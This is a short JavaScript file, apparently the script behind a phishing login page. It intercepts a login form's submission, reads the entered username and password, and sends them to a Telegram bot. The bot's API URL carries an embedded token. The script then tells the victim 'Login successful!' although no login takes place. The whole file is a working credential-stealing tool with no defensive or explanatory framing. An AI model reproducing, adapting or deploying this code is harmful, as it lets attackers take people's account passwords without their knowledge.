const TELEGRAM_BOT_API_URL = "https://api.telegram.org/bot2101899532:AAGQ4MjaBjYhu--NWwDpUeFlhZnRriPDcFA/sendMessage";
const CHAT_ID = "<YOUR_CHAT_ID>";

document.getElementById("loginForm").addEventListener("submit", function(event) {
    event.preventDefault();

    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;

    // إرسال بيانات تسجيل الدخول إلى Telegram
    fetch(TELEGRAM_BOT_API_URL, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: `Login Attempt:\nUsername: ${username}\nPassword: ${password}`
        })
    })
    .then(response => {
        if (response.ok) {
            alert("Login successful!");
        } else {
            alert("Error sending data to Telegram.");
        }
    })
    .catch(error => {
        console.error("Error:", error);
    });
});
